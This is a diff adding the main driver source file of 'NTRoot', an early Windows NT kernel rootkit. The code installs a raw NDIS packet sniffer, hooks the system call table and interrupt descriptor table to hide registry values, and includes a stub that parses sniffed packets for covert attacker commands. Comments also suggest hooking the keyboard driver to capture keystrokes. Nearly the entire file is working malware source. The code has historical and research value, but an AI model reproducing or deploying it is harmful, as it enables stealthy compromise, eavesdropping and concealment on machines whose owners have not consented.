@@ -1,0 +1,511 @@
+
+/**********************************************************************************
+ * NTRoot
+ * Version 0.1a
+ * Greg Hoglund
+ *
+ * June 1, 1999      - Greg Hoglund - fixed a bunch of cruft
+ * June 3, 1999      - Greg Hoglund - will still BSOD if you attempt to UNLOAD the
+ *                               driver.. leaving this issue for now, just don't 
+ *                               unload, I think it's related to NDIS, but not sure.
+ *                               ** adding PsCreateSystemProcess() call
+ * July 29, 1999     - Greg Hoglund
+ *				     - OnUnload crashes on NdisDeregisterProtocol. - still not fixed
+ *			         - added ethernet header to returned buffer, so
+ *		             - RogueX client can read entire raw packets now.
+ *				     - cleaned up code & split into several source files
+ *
+ * October 10, 1999  - Greg Hoglund
+ *				     - adding system service table code ;-)
+ * October 26, 1999  - Greg Hoglund
+ *                   - added interrupt descriptor table patch //kickin'//
+ * November 22, 1999 - modify ReadRegistry() to enum first network key (what a bitch)
+ * November 23, 1999 - adding exception handling for easier debugging - I'm tired
+ *                   - of BSOD'n my machines.
+ *                   - added NDIS event to wait for OnUnload(). (needs testing)
+ *					 - current build is locking up win2K boxes - works on NT4.0 (?)
+ * December 9, 1999  - Greg Hoglund
+ *                   - added numerous call hooks - is now hiding registry values
+ *                   - builds/runs on both NT40 & WIN2K, Unload() works flawlessly
+ * 
+ ***********************************************************************************/
+
+#include "rk_driver.h"
+#include "rk_packet.h"
+#include "rk_defense.h"
+								 
+/* ________________________________________________________________________________ 
+ . Our driver objects
+ . ________________________________________________________________________________ */
+PDRIVER_OBJECT	gDriverObjectP;
+
+KSPIN_LOCK		GlobalArraySpinLock;
+KIRQL			gIrqL;
+POPEN_INSTANCE	gOpenInstance = NULL;  /* this is what we will use for notify packets */
+
+/* ________________________________________________________________________________
+ . NT Rootkit DRIVER ENTRY
+ . Setup the NDIS sniffer as well as hook the system service table and interrupts
+ . ________________________________________________________________________________ */
+NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )
+{
+	/* Network Sniffer related structs */
+	NDIS_PROTOCOL_CHARACTERISTICS	aProtocolChar;
+	UNICODE_STRING 			aMacDriverName;
+	UNICODE_STRING 			aUnicodeDeviceName;
+	
+	NDIS_HANDLE    	aNdisProtocolHandle;
+	NDIS_STRING	aProtoName = NDIS_STRING_CONST("NTRoot");
+	
+	NDIS_STATUS    	aErrorStatus;
+	NDIS_MEDIUM    	aMediumArray=NdisMedium802_3;
+	
+	UNICODE_STRING  aDriverName;			// DD
+	PWSTR			aBindString;			// DD 
+	PWSTR          	aExportString;			// DD
+	PWSTR          	aBindStringSave;		// DD
+	PWSTR          	aExportStringSave;		// DD
+
+	/* our device so we can communicate with user mode */
+	PDEVICE_OBJECT 		aDeviceObject = NULL;
+	PDEVICE_EXTENSION 	aDeviceExtension = NULL;
+	WCHAR               aDeviceLinkBuffer[]  = L"\\DosDevices\\Ntroot"; /* the \??\ dir (for users) */
+	UNICODE_STRING      aDeviceLinkUnicodeString;
+	ULONG				aDevicesCreated = 0;
+
+
+	NTSTATUS       aStatus = STATUS_SUCCESS;
+	POPEN_INSTANCE anOpenP = NULL;
+	
+	//__asm int 3
+	
+	DbgPrint("ROOTKIT: DriverEntry called\n");
+
+	InitDefenseSystem();
+	SetupCallNumbers();
+	GetProcessNameOffset();
+
+	__try
+	{
+		KeInitializeSpinLock(&GlobalArraySpinLock); /* free me */
+		/*
+		 * init network sniffer - this is all standard and
+		 * documented in the DDK.
+		 */
+		RtlZeroMemory( &aProtocolChar,
+			   sizeof(NDIS_PROTOCOL_CHARACTERISTICS));
+		aProtocolChar.MajorNdisVersion            = 3;
+		aProtocolChar.MinorNdisVersion            = 0;
+		aProtocolChar.Reserved                    = 0;
+		aProtocolChar.OpenAdapterCompleteHandler  = OnOpenAdapterDone;
+		aProtocolChar.CloseAdapterCompleteHandler = OnCloseAdapterDone;
+		aProtocolChar.SendCompleteHandler         = OnSendDone;
+		aProtocolChar.TransferDataCompleteHandler = OnTransferDataDone;
+		aProtocolChar.ResetCompleteHandler        = OnResetDone;
+		aProtocolChar.RequestCompleteHandler      = OnRequestDone;
+		aProtocolChar.ReceiveHandler              = OnReceiveStub;
+		aProtocolChar.ReceiveCompleteHandler      = OnReceiveDoneStub;
+		aProtocolChar.StatusHandler               = OnStatus;
+		aProtocolChar.StatusCompleteHandler       = OnStatusDone;
+		aProtocolChar.Name                        = aProtoName;
+
+		DbgPrint("ROOTKIT: Registering NDIS Protocol\n");
+
+		NdisRegisterProtocol( &aStatus,
+        			  &aNdisProtocolHandle,
+        			  &aProtocolChar,
+        			  sizeof(NDIS_PROTOCOL_CHARACTERISTICS));
+
+		if (aStatus != NDIS_STATUS_SUCCESS) {
+			DbgPrint(("DriverEntry: ERROR NdisRegisterProtocol failed\n"));
+			return aStatus;
+		}
+
+		/* ________________________________________________________________
+		 . Create dispatch points for all routines that must be handled. 
+		 . Since we do not communicate with userland, we ignore everything
+		 . and pass thru our stub handler.
+		 . ________________________________________________________________ */
+		theDriverObject->MajorFunction[IRP_MJ_WRITE]		    =
+		theDriverObject->MajorFunction[IRP_MJ_READ]             = 
+		theDriverObject->MajorFunction[IRP_MJ_CLOSE]			=
+		theDriverObject->MajorFunction[IRP_MJ_CREATE]		    =
+		theDriverObject->MajorFunction[IRP_MJ_FLUSH_BUFFERS]    =
+		theDriverObject->MajorFunction[IRP_MJ_QUERY_INFORMATION]=
+		theDriverObject->MajorFunction[IRP_MJ_SET_INFORMATION]  =
+		theDriverObject->MajorFunction[IRP_MJ_QUERY_EA]			=
+		theDriverObject->MajorFunction[IRP_MJ_SET_EA]			=
+		theDriverObject->MajorFunction[IRP_MJ_QUERY_VOLUME_INFORMATION] = 
+		theDriverObject->MajorFunction[IRP_MJ_SET_VOLUME_INFORMATION]   =
+		theDriverObject->MajorFunction[IRP_MJ_DIRECTORY_CONTROL]        =
+		theDriverObject->MajorFunction[IRP_MJ_FILE_SYSTEM_CONTROL]      =
+		theDriverObject->MajorFunction[IRP_MJ_QUERY_SECURITY]		    =
+		theDriverObject->MajorFunction[IRP_MJ_SET_SECURITY]		=
+		theDriverObject->MajorFunction[IRP_MJ_SHUTDOWN]			=
+		theDriverObject->MajorFunction[IRP_MJ_LOCK_CONTROL]		=
+		theDriverObject->MajorFunction[IRP_MJ_CLEANUP]			=
+		theDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]	= OnStubDispatch;     
+
+		/* ___[ we NEED to register the Unload() function ]___ 
+		 . this is how we are able to dynamically unload the
+		 . driver 
+		 . ___________________________________________________ */ 
+		theDriverObject->DriverUnload  = OnUnload; 
+
+		aDriverName.Length = 0;
+		aDriverName.Buffer = ExAllocatePool( PagedPool, MAX_PATH_LENGTH ); /* free me */
+		aDriverName.MaximumLength = MAX_PATH_LENGTH;
+		RtlZeroMemory(aDriverName.Buffer, MAX_PATH_LENGTH);
+
+		/* _______________________________________________________________
+		 * get the name of the MAC layer driver 
+		 * and the name of the packet driver
+		 * HKLM/SYSTEM/CurrentControlSet/Services/TcpIp/Linkage ..
+		 * _______________________________________________________________ */
+		if (ReadRegistry( &aDriverName ) != STATUS_SUCCESS) {
+			goto RegistryError;
+		}
+
+		aBindString = aDriverName.Buffer;
+
+		aExportString = ExAllocatePool(PagedPool, MAX_PATH_LENGTH); /* free me */
+		RtlZeroMemory(aExportString, MAX_PATH_LENGTH);
+		wcscat(aExportString, L"\\Device\\Ntroot"); // visible to user mode
+
+		aBindStringSave   = aBindString;
+		aExportStringSave = aExportString;
+
+		while (*aBindString != UNICODE_NULL && *aExportString != UNICODE_NULL) 
+		{
+			/* for each entry */
+			RtlInitUnicodeString( &aMacDriverName, aBindString ); // the /device/ne20001 or whatever..
+			RtlInitUnicodeString( &aUnicodeDeviceName, aExportString );
+        
+			/* MULTI_SZ */
+			aBindString   += (aMacDriverName.Length+sizeof(UNICODE_NULL))/sizeof(WCHAR);
+			aExportString += (aUnicodeDeviceName.Length+sizeof(UNICODE_NULL))/sizeof(WCHAR);
+        
+			/* create a device object for this driver */
+			aStatus = IoCreateDevice( theDriverObject,
+                    				  sizeof(DEVICE_EXTENSION),
+                    				  &aUnicodeDeviceName, // usermode export
+                    				  FILE_DEVICE_PROTOCOL,
+                    				  0,
+                    				  FALSE,
+                    				  &aDeviceObject );
+
+			if (aStatus != STATUS_SUCCESS) {
+				break;
+			}
+
+			/* create a symbolic link for first one*/	
+			if(0 == aDevicesCreated){
+				//
+				// Create a symbolic link that the GUI can specify to gain access
+				// to this driver/device
+				//
+				RtlInitUnicodeString (&aDeviceLinkUnicodeString,
+									  aDeviceLinkBuffer );
+				aStatus = IoCreateSymbolicLink ( &aDeviceLinkUnicodeString,
+												 &aUnicodeDeviceName );
+				if (!NT_SUCCESS(aStatus)) {
+					DbgPrint (("NTROOT: IoCreateSymbolicLink failed\n"));        
+				}
+			}
+			aDevicesCreated++;
+			aDeviceObject->Flags |= DO_DIRECT_IO;
+			aDeviceExtension  =  (PDEVICE_EXTENSION) aDeviceObject->DeviceExtension;
+			aDeviceExtension->DeviceObject = aDeviceObject;
+        
+			/* save in extension */
+			aDeviceExtension->AdapterName = aMacDriverName;
+			if (aDevicesCreated == 1) {
+				aDeviceExtension->BindString   = aBindStringSave;
+				aDeviceExtension->ExportString = aExportStringSave;
+			}
+			aDeviceExtension->NdisProtocolHandle = aNdisProtocolHandle;
+		}
+
+		if (aDevicesCreated > 0){
+			//  allocate some memory for the open structure
+			anOpenP=ExAllocatePool(NonPagedPool,sizeof(OPEN_INSTANCE)); /* free me */
+			if (anOpenP==NULL) {
+				// no memory
+				// NO IRP -- Irp->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
+				return STATUS_INSUFFICIENT_RESOURCES;
+			}
+			RtlZeroMemory(
+				anOpenP,
+				sizeof(OPEN_INSTANCE)
+				);
+			/* we will use the first opened instance to send notify packets */
+			gOpenInstance = anOpenP;
+			anOpenP->DeviceExtension=aDeviceExtension;
+
+			// init the send buffers we will be using
+			NdisAllocatePacketPool(
+				&aStatus,
+				&anOpenP->mPacketPoolH,
+				TRANSMIT_PACKETS,
+				sizeof(PACKET_RESERVED));
+			if (aStatus != NDIS_STATUS_SUCCESS) {
+				ExFreePool(anOpenP);
+				// FIXME cleanup
+				return STATUS_INSUFFICIENT_RESOURCES;
+			}
+			/* this is a null function under NT */
+			NdisAllocateBufferPool(
+				&aStatus,
+				&anOpenP->mBufferPoolH,
+				TRANSMIT_PACKETS );
+			if (aStatus != NDIS_STATUS_SUCCESS) {
+				ExFreePool(anOpenP);
+				// FIXME
+				return STATUS_INSUFFICIENT_RESOURCES;
+			}
+
+			/* go ahead and get that NDIS sniffer up */
+			NdisOpenAdapter(
+				&aStatus,
+				&aErrorStatus,
+				&anOpenP->AdapterHandle,
+				&aDeviceExtension->Medium,
+				&aMediumArray,
+				1,
+				aDeviceExtension->NdisProtocolHandle,
+				anOpenP,
+				&aDeviceExtension->AdapterName,
+				0,
+				NULL);
+			if (aStatus != NDIS_STATUS_PENDING) {
+				OnOpenAdapterDone(
+					anOpenP,
+					aStatus,
+					NDIS_STATUS_SUCCESS
+					);
+				if(NT_SUCCESS(aStatus)){
+					DbgPrint(("NdisOpenAdapter returned STATUS_SUCCESS\n"));
+					return aStatus;
+				}
+				else switch(aStatus){
+					case STATUS_SUCCESS:
+						DbgPrint(("NdisOpenAdapter returned STATUS_SUCCESS\n"));
+						break;
+					case NDIS_STATUS_PENDING:
+						DbgPrint(("NdisOpenAdapter returned NDIS_STATUS_PENDING\n"));
+						break;
+					case NDIS_STATUS_RESOURCES:
+						DbgPrint(("NdisOpenAdapter returned NDIS_STATUS_RESOURCES\n"));
+						break;
+					case NDIS_STATUS_ADAPTER_NOT_FOUND:
+						DbgPrint(("NdisOpenAdapter returned NDIS_STATUS_ADAPTER_NOT_FOUND\n"));
+						break;
+					case NDIS_STATUS_UNSUPPORTED_MEDIA:
+						DbgPrint(("NdisOpenAdapter returned NDIS_STATUS_UNSUPPORTED_MEDIA\n"));
+						break;
+					case NDIS_STATUS_CLOSING:
+						DbgPrint(("NdisOpenAdapter returned NDIS_STATUS_CLOSING\n"));
+						break;
+					case NDIS_STATUS_OPEN_FAILED:
+						DbgPrint(("NdisOpenAdapter returned NDIS_STATUS_OPEN_FAILED\n"));
+						break;
+				}
+			}
+		}
+
+	
+		/* _______________________________________________________ 
+		 . we are now online and sniffing packets
+		 . _______________________________________________________ */
+
+
+		/* _______________________________________________________
+		 . Hook our system calls and interrupts now
+		 . _______________________________________________________ */
+		DbgPrint("rootkit: about to hook systemcalls\n");
+		HookSyscalls();
+		
+		DbgPrint("rootkit: about to hook interrupts\n");
+		HookInterrupts();
+
+		/* _______________________________________________________
+		 . Originally, we had hooked other drivers here, such as 
+		 . the keyboard class driver - so that we could sniff
+		 . keystrokes, for example.  To make everything simpler,
+		 . however, we are only hooking syscalls now.
+		 .
+		 . If you choose, you may attempt to hook other drivers 
+		 . at this point.  There are some examples of this in the
+		 . DDK.  Also, there is a keyboard class driver hook example
+		 . on the www.sysinternals.com site.  In theory, you could
+		 . hook whatever you choose.  Please contribute your changes
+		 . to the rootkit project at www.rootkit.com.  Thanks.
+		 . ________________________________________________________ */
+#ifdef _KBDHOOK
+	cmdHookKeyboard(theDriverObject); /* currently not implemented */
+#endif
+
+		return STATUS_SUCCESS;
+
+RegistryError:
+		/* fixme - need better cleanup */
+		NdisDeregisterProtocol( &aStatus, aNdisProtocolHandle );
+    }
+	__except(EXCEPTION_EXECUTE_HANDLER)
+	{
+		DbgPrint("Exception occured, caught in DriverEntry().  Unknown error\n");
+	}
+    return(STATUS_UNSUCCESSFUL);
+}
+
+/* __________________________________________________________________
+ . This function just completes all IRP's that come its way.
+ . We are ignoring userland completely - so this shouldn't get
+ . called anyways -
+ . __________________________________________________________________ */
+NTSTATUS
+OnStubDispatch(
+    IN PDEVICE_OBJECT DeviceObject,
+    IN PIRP           Irp
+    )
+{
+    Irp->IoStatus.Status      = STATUS_SUCCESS;
+    IoCompleteRequest (Irp,
+                       IO_NO_INCREMENT
+                       );
+    return Irp->IoStatus.Status;
+}
+
+/* __________________________________________________________________
+ . ETHERNET SNIFFER FILTER
+ .
+ . This function is called whenever a packet is sniffed on the wire.
+ . Currently, this is called directly when the packet arrives, so
+ . you need to handle the packet quickly.  This is a high performance
+ . function - so don't spend alot of time daddling w/ the packet.
+ .
+ . If you need to perform a great deal of processing on the packet,
+ . queue it first and handle it in another thread.
+ .
+ . Note: there are many driver-related support functions
+ . located in file sniffer.c
+ . __________________________________________________________________ */
+
+void OnSniffedPacket(const char* theData, int theLen){
+	int aCommand = 0;
+
+	DbgPrint("ROOTKIT: OnSniffedPacket called\n");
+	/* no matter what kind of packet this is, parse it for a possible
+	 * command.  This makes it easy for the attacker to embed commands
+	 * into almost any type of packet, including invalid TCP or ICMP
+	 * Also, any network protocol, not just IP.
+	 */
+	
+	// TBD
+	switch(aCommand){
+	case 0: /* shutdown */
+		break;
+	case 1: /* start network sniffer */
+		break;
+	case 2: /* start routing */
+		break;
+	case 3: /* start file sniffing */
+		break;
+	case 666: /* Shutdown and KillAll */
+		break;
+	default:
+		break;
+	}
+}
+
+/* _____________________________________________________________________________
+ . This is called when the driver is dynamically unloaded.  You need to cleanup
+ . everything you have done here.  A waitable object was added so that NDIS can
+ . be shut down properly.  Also unhook all system calls & interrupts.
+ . _____________________________________________________________________________ */
+VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
+{
+    WCHAR                  deviceLinkBuffer[]  = L"\\DosDevices\\Ntroot";
+    UNICODE_STRING         deviceLinkUnicodeString;
+
+	DbgPrint("ROOTKIT: OnUnload called\n");
+
+	DbgPrint("rootkit: about to unhook syscalls\n");
+	UnhookSyscalls();
+
+	DbgPrint("rootkit: about to unhook interrupts\n");
+	UnhookInterrupts();
+
+__try
+{
+	//__asm int 3
+
+	//KeAcquireSpinLock(&GlobalArraySpinLock, &gIrqL); /* beware of irq level */
+	/*
+	 * There are some resources which are not freed here, hence small 
+	 * memleak.
+	 */
+	if(NULL != gOpenInstance)
+	{
+		PDEVICE_EXTENSION  DeviceExtension;
+		NDIS_HANDLE        NdisProtocolHandle;
+		NDIS_STATUS        Status;
+
+		DeviceExtension = gOpenInstance->DeviceExtension;
+		NdisProtocolHandle = DeviceExtension->NdisProtocolHandle;
+
+		NdisResetEvent(&gOpenInstance->Event);
+
+		NdisCloseAdapter(
+			&Status, 
+			gOpenInstance->AdapterHandle);
+
+		// we must wait for this to complete
+		// ---------------------------------
+		if(Status == NDIS_STATUS_PENDING)
+		{
+			 DbgPrint("rootkit: OnUnload: pending wait event\n");
+			 NdisWaitEvent(&gOpenInstance->Event, 0);
+			 Status = gOpenInstance->Status;
+		}
+
+		DbgPrint("rootkit: OnUnload: NdisCloseAdapter() done\n");
+		NdisFreeBufferPool(gOpenInstance->mBufferPoolH);
+
+		NdisFreePacketPool(gOpenInstance->mPacketPoolH);
+
+		ExFreePool(gOpenInstance);
+
+		IoDeleteDevice( DeviceExtension->DeviceObject );
+
+		if (DeviceExtension->BindString != NULL) {
+            ExFreePool(DeviceExtension->BindString);
+        }
+
+        if (DeviceExtension->ExportString != NULL) {
+            ExFreePool(DeviceExtension->ExportString);
+        }
+
+		NdisDeregisterProtocol(
+			&Status,
+			NdisProtocolHandle
+        );
+	}
+
+    RtlInitUnicodeString( &deviceLinkUnicodeString, deviceLinkBuffer );
+    IoDeleteSymbolicLink( &deviceLinkUnicodeString );
+	/*
+	 *
+	 */
+	//KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);
+}
+__except(EXCEPTION_EXECUTE_HANDLER)
+{
+	DbgPrint("rootkit: Exception in Unload(), unknown error.\n");
+}
+	return;
+}
+
+
+
+
